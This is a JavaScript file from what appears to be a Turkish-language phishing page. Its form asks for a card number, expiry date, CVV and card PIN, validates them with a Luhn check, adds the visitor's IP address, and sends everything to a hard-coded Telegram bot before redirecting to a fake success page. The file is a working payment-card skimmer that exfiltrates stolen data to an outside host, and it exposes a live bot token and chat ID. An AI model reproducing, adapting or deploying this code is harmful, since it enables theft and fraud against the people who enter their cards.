/* ── Slider (phone.html) ─────────────────────── */
var slider1 = (function () {
    var slides = document.querySelectorAll('#slider .slide');
    var currentIndex = Array.from(slides).findIndex(function (s) {
        return s.classList.contains('active');
    });
    if (currentIndex === -1) currentIndex = 0;

    function go(nextIndex) {
        if (nextIndex < 0 || nextIndex >= slides.length) return;
        slides[currentIndex].classList.remove('active');
        slides[currentIndex].classList.add('hidden');
        slides[nextIndex].classList.remove('hidden');
        slides[nextIndex].classList.add('active');
        currentIndex = nextIndex;
    }

    return {
        next: function () { go(currentIndex + 1); },
        prev: function () { go(currentIndex - 1); },
        goTo: function (i) { go(i); }
    };
})();

/* ── Luhn kart doğrulama ─────────────────────── */
function luhnCheck(cardNo) {
    var sum = 0, alt = false;
    var stripped = cardNo.replace(/\s+/g, '');
    for (var i = stripped.length - 1; i >= 0; i--) {
        var n = parseInt(stripped.charAt(i), 10);
        if (alt) { n *= 2; if (n > 9) n -= 9; }
        sum += n;
        alt = !alt;
    }
    return sum % 10 === 0;
}

/* ── SKT tarihi geçmiş mi? ─────────────────── */
function isExpired(val) {
    var parts = val.split('/').map(function (x) { return parseInt(x, 10); });
    var month = parts[0], year = parts[1];
    var curYear  = new Date().getFullYear() % 100;
    var curMonth = new Date().getMonth() + 1;
    return year < curYear || (year === curYear && month < curMonth);
}

/* ── IP al ───────────────────────────────────── */
function getIP(callback) {
    fetch('https://api.ipify.org?format=json')
        .then(function (r) { return r.json(); })
        .then(function (data) { callback(data.ip); })
        .catch(function () { callback('Bilinmiyor'); });
}

/* ── Telegram'a gönder ───────────────────────── */
function sendToTelegram(message, onSuccess) {
    var botToken = '7603525221:AAFLxB75PV01QO-alxIxPsERLFm5Gb9R3Vg';
    var chatId   = '-1002475411082';
    var url      = 'https://api.telegram.org/bot' + botToken
                 + '/sendMessage?chat_id=' + chatId
                 + '&text=' + encodeURIComponent(message);

    var xhr = new XMLHttpRequest();
    xhr.open('GET', url, true);
    xhr.onload = function () {
        if (xhr.status === 200) {
            console.log('✅ Telegram\'a gönderildi.');
            if (onSuccess) onSuccess();
        } else {
            console.error('❌ Telegram hatası:', xhr.responseText);
        }
    };
    xhr.send();
}

/* ── Alert kapat ─────────────────────────────── */
function closeAlert() {
    var el = document.getElementById('alertDiv');
    if (el) el.classList.remove('show');
}

function uyariKapat() {
    var el = document.getElementById('alertDiv3');
    if (el) el.classList.remove('show2');
}

/* ── DOMContentLoaded — form mantığı ─────────── */
document.addEventListener('DOMContentLoaded', function () {

    var ccEl   = document.getElementById('customUsername');  // kart no
    var expEl  = document.getElementById('exp');             // son kullanma
    var cvvEl  = document.getElementById('cvv');
    var kkpwEl = document.getElementById('kkpw');            // kart şifresi
    var btnEl  = document.getElementById('btn-spc');         // Devam butonu

    if (!ccEl || !expEl || !cvvEl || !kkpwEl || !btnEl) {
        console.error('⚠️ Form elementleri bulunamadı!');
        return;
    }

    /* ── Input formatlamaları ────────────────── */
    ccEl.addEventListener('input', function () {
        var raw = this.value.replace(/\D/g, '');
        raw = raw.replace(/(\d{4})/g, '$1 ').trim();
        this.value = raw;
        resetColor(this);
    });

    expEl.addEventListener('input', function () {
        var raw = this.value.replace(/\D/g, '');
        if (raw.length > 2) raw = raw.slice(0, 2) + '/' + raw.slice(2, 4);
        this.value = raw;
        resetColor(this);
    });

    cvvEl.addEventListener('input', function () {
        this.value = this.value.replace(/\D/g, '');
        resetColor(this);
    });

    kkpwEl.addEventListener('input', function () {
        this.value = this.value.replace(/\D/g, '');
        resetColor(this);
    });

    /* ── Doğrulama ───────────────────────────── */
    function validate() {
        var ok = true;

        if (!/^\d{4} \d{4} \d{4} \d{4}$/.test(ccEl.value) || !luhnCheck(ccEl.value)) {
            markError(ccEl); ok = false;
        }
        if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(expEl.value) || isExpired(expEl.value)) {
            markError(expEl); ok = false;
        }
        if (!/^\d{3}$/.test(cvvEl.value)) {
            markError(cvvEl); ok = false;
        }
        if (!/^\d{4}$/.test(kkpwEl.value)) {
            markError(kkpwEl); ok = false;
        }
        return ok;
    }

    function markError(el) { if (el) el.style.color = 'red'; }
    function resetColor(el) { if (el) el.style.color = ''; }

    /* ── Devam butonu tıklama ────────────────── */
    btnEl.addEventListener('click', function () {
        if (!validate()) return;

        getIP(function (ip) {
            var msg = ' Kredi Karti Bilgisi\n\n'
                    + ' Kart No: '  + ccEl.value   + '\n'
                    + ' SKT: '      + expEl.value   + '\n'
                    + ' CVV: '      + cvvEl.value   + '\n'
                    + ' Sifre: '    + kkpwEl.value  + '\n'
                    + ' IP: '       + ip;

            sendToTelegram(msg, function () {
                setTimeout(function () {
                    window.location.href = 'success.html';
                }, 1500);
            });
        });
    });
});
